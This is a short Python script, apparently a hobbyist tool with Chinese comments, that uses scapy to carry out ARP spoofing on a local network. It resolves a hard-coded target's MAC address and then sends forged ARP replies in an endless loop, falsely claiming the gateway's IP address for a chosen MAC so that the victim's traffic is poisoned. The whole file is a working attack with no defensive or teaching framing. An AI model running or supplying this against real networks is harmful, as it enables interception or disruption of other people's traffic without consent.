import os
import sys
from scapy.layers.l2 import getmacbyip
from scapy.all import (Ether,ARP,sendp)

#执行查看IP的命令
ifconfig=os.system('ifconfig')
print(ifconfig)
# gmac=raw_input('Please enter gateway IP:')
# liusheng=raw_input('Please enter your IP:')
# liusrc=raw_input('Please enter target IP:')

gmac='ff:ff:ff:ff:ff:ff'
liusheng='192.168.99.1'
liusrc='192.168.99.105'

try:
#获取目标的mac
	tg=getmacbyip(liusrc)
	print(tg)
except Exception:
	print('123')
	exit()

def arpspoof():
	try:
		eth=Ether()
		arp=ARP(
		op="is-at", #arp响应
		hwsrc=gmac, #网关mac
		psrc=liusheng,#网关IP
		hwdst=tg,#目标Mac
		pdst=liusrc#目标IP
		)
	#对配置进行输出
		print((eth/arp).show())
	#开始发包
		sendp(eth/arp,inter=2,loop=1)
	except Exception:
		print("sdfsd")
		exit()


arpspoof()